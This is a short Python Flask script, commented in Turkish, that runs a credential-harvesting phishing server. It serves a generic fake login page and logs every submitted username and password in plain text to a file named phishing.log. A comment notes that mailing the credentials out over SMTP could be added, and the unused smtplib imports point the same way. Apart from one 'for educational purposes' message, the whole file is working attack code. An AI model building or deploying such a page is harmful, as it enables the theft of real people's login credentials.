# -*- coding: utf-8 -*-
import smtplib
from email.mime.text import MIMEText
import logging
from flask import Flask, request, render_template_string

app = Flask(__name__)

# Logging yapılandırması
logging.basicConfig(filename='phishing.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Sahte giriş formu
login_form = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            text-align: center;
        }
        .container h2 {
            margin-bottom: 20px;
        }
        .container input[type="text"],
        .container input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .container input[type="submit"] {
            background-color: #28a745;
            color: #fff;
            padding: 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .container input[type="submit"]:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Login</h2>
        <form method="POST" action="/login">
            <input type="text" id="username" name="username" placeholder="Username" required><br><br>
            <input type="password" id="password" name="password" placeholder="Password" required><br><br>
            <input type="submit" value="Login">
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(login_form)

@app.route('/login', methods=['POST'])
def login():
    try:
        username = request.form['username']
        password = request.form['password']
        
        # Kullanıcı bilgilerini log dosyasına kaydetme
        logging.info("Username: {}, Password: {}".format(username, password))
        
        # Burada olası bir SMTP sunucusuna kullanıcı bilgilerini gönderme kodu eklenebilir
        
        return "Information has been captured for educational purposes."
    except Exception as e:
        logging.error("Error capturing login information: {}".format(e))
        return "An error occurred. Please try again later."

def main():
    app.run(host='0.0.0.0', port=5000)

if __name__ == "__main__":
    main()